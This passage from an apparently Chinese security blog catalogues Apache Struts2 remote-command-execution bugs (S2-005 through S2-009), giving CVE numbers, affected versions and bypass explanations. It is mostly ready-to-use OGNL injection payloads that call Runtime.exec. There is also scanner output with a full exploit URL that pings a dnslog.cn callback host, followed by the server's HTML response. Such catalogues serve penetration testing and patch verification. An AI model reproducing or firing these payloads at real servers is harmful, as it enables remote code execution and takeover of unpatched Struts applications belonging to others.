<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>获取Web路径：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h4 id="0x02-Struts2远程命令执行漏洞-s2-005"><a href="#0x02-Struts2远程命令执行漏洞-s2-005" class="headerlink" title="0x02 Struts2远程命令执行漏洞(s2-005)"></a>0x02 Struts2远程命令执行漏洞(s2-005)</h4><h5 id="漏洞详情-1"><a href="#漏洞详情-1" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2010-8-15</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2010-1870</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts 2.0.0 - Struts 2.1.8.1</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。</span><br><span class="line">S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-1"><a href="#请求方式-1" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>有回显POC，需要把<code>\</code>和<code>‘</code>符号进行编码，并且有些返回内容不会显示，而是直接下载下来的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(bla)(bla)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/2.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617105816051" class="fancybox"><img alt="image-20200617105816051" title="image-20200617105816051" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/2.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x03-Struts2远程命令执行漏洞-s2-007"><a href="#0x03-Struts2远程命令执行漏洞-s2-007" class="headerlink" title="0x03 Struts2远程命令执行漏洞(s2-007)"></a>0x03 Struts2远程命令执行漏洞(s2-007)</h4><h5 id="漏洞详情-2"><a href="#漏洞详情-2" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011-9-9</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.0.0-2.2.3</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当有转换错误时，用户输入被评估为OGNL表达式。这允许恶意用户执行任意代码。</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-2"><a href="#请求方式-2" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-2"><a href="#POC-2" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>这个洞只能手动测试，没得脚本，下面是POC，类似这种标签里面存在注入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/3.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617143256486" class="fancybox"><img alt="image-20200617143256486" title="image-20200617143256486" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/3.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x04-Struts2远程命令执行漏洞-s2-008"><a href="#0x04-Struts2远程命令执行漏洞-s2-008" class="headerlink" title="0x04 Struts2远程命令执行漏洞(s2-008)"></a>0x04 Struts2远程命令执行漏洞(s2-008)</h4><h5 id="漏洞详情-3"><a href="#漏洞详情-3" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.0.0-2.2.3</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-3"><a href="#请求方式-3" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-3"><a href="#POC-3" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>打开mac计算器POC</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug&#x3D;command&amp;expression&#x3D;(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>脚本执行其他命令结果</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/4.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617145907713" class="fancybox"><img alt="image-20200617145907713" title="image-20200617145907713" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/4.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x05-Struts2远程命令执行漏洞-s2-009"><a href="#0x05-Struts2远程命令执行漏洞-s2-009" class="headerlink" title="0x05 Struts2远程命令执行漏洞(s2-009)"></a>0x05 Struts2远程命令执行漏洞(s2-009)</h4><h5 id="漏洞详情-4"><a href="#漏洞详情-4" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2012-1-20</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2011-3923</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.1.0-2.3.1.1</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2对s2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</span><br><span class="line"></span><br><span class="line">但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用&#x2F;helloword.acton?example&#x3D;&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)&#x3D;1的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-4"><a href="#请求方式-4" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-4"><a href="#POC-4" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>使用POC，生成文件的，其他命令自行修改</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20&#x2F;tmp&#x2F;success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]&#x3D;true</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>脚本测试返回值</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.124 存在Struts2远程代码执行漏洞(S2-009)</span><br><span class="line">漏洞详情:</span><br><span class="line">版本号:S2-009</span><br><span class="line">使用EXP:http:&#x2F;&#x2F;192.168.8.124:8080&#x2F;ajax&#x2F;example5?age&#x3D;medusa&amp;name&#x3D;%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3D+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20ARrayeBeG676LjR.b3ffm7.dnslog.cn%27%29%29%28meh%29&amp;z%5B%28name%29%28%27meh%27%29%5D&#x3D;true</span><br><span class="line">返回数据:&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.1 Transitional&#x2F;&#x2F;EN&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot; lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Ajax examples - tabbled panel&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;styles&#x2F;main.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;all&quot;&#x2F;&gt;</span><br><span class="line">    &lt;!--&#x2F;&#x2F; START SNIPPET: common-include--&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    &#x2F;&#x2F; Dojo configuration</span><br><span class="line">    djConfig &#x3D; &#123;</span><br><span class="line">        isDebug: false,</span><br><span class="line">        bindEncoding: &quot;UTF-8&quot;</span><br><span class="line">          ,baseRelativePath: &quot;&#x2F;struts&#x2F;dojo&#x2F;&quot;</span><br><span class="line">          ,baseScriptUri: &quot;&#x2F;struts&#x2F;dojo&#x2F;&quot;</span><br><span class="line">         ,parseWidgets : false</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;</span><br><span class="line">        src&#x3D;&quot;&#x2F;struts&#x2F;dojo&#x2F;struts_dojo.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;</span><br><span class="line">        src&#x3D;&quot;&#x2F;struts&#x2F;ajax&#x2F;dojoRequire.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;struts&#x2F;xhtml&#x2F;styles.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; src&#x3D;&quot;&#x2F;struts&#x2F;utils.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; src&#x3D;&quot;&#x2F;struts&#x2F;xhtml&#x2F;validation.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; src&#x3D;&quot;&#x2F;struts&#x2F;css_xhtml&#x2F;validation.js&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;!--&#x2F;&#x2F; END SNIPPET: common-include--&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body id&#x3D;&quot;page-home&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;page&quot;&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;outer-header&quot;&gt;</span><br><span class="line">        &lt;div id&#x3D;&quot;header&quot; class&#x3D;&quot;clearfix&quot;&gt;</span><br><span class="line">            &lt;div id&#x3D;&quot;branding&quot;&gt;</span><br><span class="line">                &lt;h1 class&#x3D;&quot;title&quot;&gt;Struts Showcase&lt;&#x2F;h1&gt;</span><br><span class="line">                </span><br><span class="line">2020&#x2F;06&#x2F;17 07:15:18</span><br><span class="line"></span><br><span class="line">            &lt;&#x2F;div&gt;&lt;!-- end branding --&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div id&#x3D;&quot;search&quot;&gt;</span><br><span class="line">                &lt;img src&#x3D;&quot;&#x2F;images&#x2F;struts-power.gif&quot; alt&#x3D;&quot;Powered by Struts&quot;&#x2F;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;&lt;!-- end search --&gt;</span><br><span class="line"></span><br><span class="line">            &lt;hr&#x2F;&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;clear: both;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;&lt;!-- end header --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id&#x3D;&quot;content&quot; class&#x3D;&quot;clearfix&quot;&gt;</span><br><span class="line">        &lt;div id&#x3D;&quot;nav&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">                &lt;h2 class&#x3D;&quot;accessibility&quot;&gt;Navigation&lt;&#x2F;h2&gt;</span><br><span class="line">                &lt;ul class&#x3D;&quot;clearfix&quot;&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;showcase.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Home&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;ajax&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Ajax&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;chat&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Ajax Chat&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;actionchaining&#x2F;actionChain1!input.action;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Action Chaining&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;config-browser&#x2F;index.action;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Config Browser&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;conversion&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Conversion&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a 